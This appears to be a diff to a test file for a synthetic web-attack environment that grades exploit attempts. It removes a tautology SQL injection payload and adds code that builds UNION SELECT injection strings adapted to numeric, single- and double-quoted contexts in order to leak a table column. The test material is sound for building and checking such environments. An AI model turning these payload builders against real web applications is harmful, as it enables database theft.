@@ -20,7 +20,7 @@ These lock that surface in, and prove a real exploit-over-HTTP reaches ``1.0``.
 from __future__ import annotations
 
 import json
-from collections.abc import Callable, Iterator
+from collections.abc import Callable, Iterator, Mapping
 from pathlib import Path
 from urllib.parse import urlencode
 
@@ -53,8 +53,6 @@ _MANIFEST = {
     "loot_shapes": {"db": 1, "file": 0},
     "vuln_kinds": {"sql_injection": 1},
 }
-# A classic tautology: `... WHERE key = '' OR '1'='1'` dumps every row.
-_SQLI_PAYLOAD = "' OR '1'='1"
 
 EnvMaker = Callable[[], WebTargetEnv]
 
@@ -98,10 +96,12 @@ def _truth_flag(snapshot: Snapshot, task: TaskSpec) -> str:
     return str(snapshot.graph.nodes[task.goal_nodes[0]].attrs["value_ref"])
 
 
-def _sqli_param(snapshot: Snapshot) -> str:
+def _sqli_params(snapshot: Snapshot) -> Mapping[str, object]:
     for vuln in snapshot.graph.by_kind("vulnerability"):
         if vuln.attrs.get("kind") == "sql_injection":
-            return str(vuln.attrs["params"]["target_param"])
+            params = vuln.attrs["params"]
+            assert isinstance(params, Mapping)
+            return params
     raise AssertionError("seed=0 should plant a sql_injection vulnerability")
 
 
@@ -116,7 +116,16 @@ def _grade(env: WebTargetEnv) -> float:
 
 def _exploit_path(snapshot: Snapshot, task: TaskSpec) -> str:
     url = _entrypoint_url(snapshot, task)
-    return f"{url}?{urlencode({_sqli_param(snapshot): _SQLI_PAYLOAD})}"
+    params = _sqli_params(snapshot)
+    union = f"UNION SELECT key, {params['leak_column']} FROM {params['table']} -- "
+    ctx = params.get("context", "single")
+    if ctx == "numeric":
+        payload = f"0 {union}"  # unquoted predicate
+    elif ctx == "double":
+        payload = f'" {union}'  # close the double-quoted literal
+    else:
+        payload = f"' {union}"  # close the single-quoted literal
+    return f"{url}?{urlencode({str(params['target_param']): payload})}"
 
 
 def _report(
